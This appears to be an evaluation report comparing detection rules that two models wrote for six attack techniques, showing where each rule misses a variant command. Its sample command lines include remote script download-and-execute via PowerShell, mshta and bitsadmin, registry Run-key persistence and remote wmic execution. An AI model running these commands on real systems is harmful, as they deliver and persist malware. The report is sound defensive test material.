# Set 1 Prompt v2.1 Failure Examples (Run 20261106_1344)

This document shows the repeat 1 detection blocks for six key techniques that failed the strict gate under prompt v2_1.
Values that fire on the shown line but fail on the hidden variant are marked as `[BLOCKS VARIANT]`.

## Technique: T1059.001

### Model: `qwen2.5-coder:7b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \powershell.exe
    CommandLine|contains|windash|all:
    - -nop
    - -w hidden
    - IEX
    - DownloadString
    - http://
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \powershell.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: -nop` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|windash|all: -w hidden` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|windash|all: IEX` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: DownloadString` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: http://` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

### Model: `qwen2.5-coder:14b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \powershell.exe
    CommandLine|contains|windash|all:
    - -nop
    - -w hidden
    - -c IEX (New-Object Net.WebClient).DownloadString
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \powershell.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: -nop` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|windash|all: -w hidden` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|windash|all: -c IEX (New-Object Net.WebClient).DownloadString` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

**Shown command line:**
```text
powershell.exe -nop -w hidden -c IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')
```
**Variant command line:**
```text
powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"
```

---

## Technique: T1218.011

### Model: `qwen2.5-coder:7b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \rundll32.exe
    CommandLine|contains|all:
    - \Windows\Temp\
    - .sys
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \rundll32.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: \Windows\Temp\` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|all: .sys` -> [MATCHES BOTH] (fires on shown and variant)

### Model: `qwen2.5-coder:14b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \rundll32.exe
    CommandLine|contains|all:
    - .sys
    - ',Run'
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \rundll32.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: .sys` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: ,Run` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

**Shown command line:**
```text
rundll32.exe C:\Windows\Temp\driver.sys,Run
```
**Variant command line:**
```text
rundll32.exe D:\drivers\helper.sys,Start
```

---

## Technique: T1218.005

### Model: `qwen2.5-coder:7b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \mshta.exe
    CommandLine|contains|all:
    - 'javascript:'
    - GetObject(
    - .Exec();
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \mshta.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: javascript:` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: GetObject(` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|all: .Exec();` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

### Model: `qwen2.5-coder:14b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \mshta.exe
    CommandLine|contains|all:
    - 'javascript:'
    - GetObject
    - Exec
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \mshta.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: javascript:` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: GetObject` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|all: Exec` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

**Shown command line:**
```text
mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()
```
**Variant command line:**
```text
mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))
```

---

## Technique: T1547.001

### Model: `qwen2.5-coder:7b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \reg.exe
    CommandLine|contains|windash|all:
    - HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    - /v
    - /d
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \reg.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: HKCU\Software\Microsoft\Windows\CurrentVersion\Run` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|windash|all: /v` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: /d` -> [MATCHES BOTH] (fires on shown and variant)

### Model: `qwen2.5-coder:14b`

Detection block:
```yaml
detection:
  selection_img:
    Image|endswith: \reg.exe
  selection_cli:
    CommandLine|contains|all:
    - add
    - HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
    - /v
  condition: all of selection_*
```

Condition evaluation against variant:
- `Image|endswith: \reg.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: add` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|all: /v` -> [MATCHES BOTH] (fires on shown and variant)

**Shown command line:**
```text
reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe
```
**Variant command line:**
```text
reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f
```

---

## Technique: T1197

### Model: `qwen2.5-coder:7b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \bitsadmin.exe
    CommandLine|contains|windash|all:
    - /download
    - /priority
    - http://
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \bitsadmin.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: /download` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: /priority` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: http://` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

### Model: `qwen2.5-coder:14b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \bitsadmin.exe
    CommandLine|contains|windash|all:
    - /transfer
    - /download
    - /priority high
    - .dll
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \bitsadmin.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: /transfer` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: /download` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|windash|all: /priority high` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)
- `CommandLine|contains|windash|all: .dll` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

**Shown command line:**
```text
bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll
```
**Variant command line:**
```text
bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1
```

---

## Technique: T1047

### Model: `qwen2.5-coder:7b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \wmic.exe
    CommandLine|contains|all:
    - process call create
    - cmd.exe /c
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \wmic.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: process call create` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: cmd.exe /c` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

### Model: `qwen2.5-coder:14b`

Detection block:
```yaml
detection:
  selection:
    Image|endswith: \wmic.exe
    CommandLine|contains|all:
    - process call create
    - cmd.exe /c
  condition: selection
```

Condition evaluation against variant:
- `Image|endswith: \wmic.exe` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: process call create` -> [MATCHES BOTH] (fires on shown and variant)
- `CommandLine|contains|all: cmd.exe /c` -> **[BLOCKS VARIANT]** (fires on shown line, misses variant)

**Shown command line:**
```text
wmic.exe process call create "cmd.exe /c calc.exe"
```
**Variant command line:**
```text
wmic.exe /node:10.0.0.8 process call create "powershell.exe -enc AAAA"
```

---
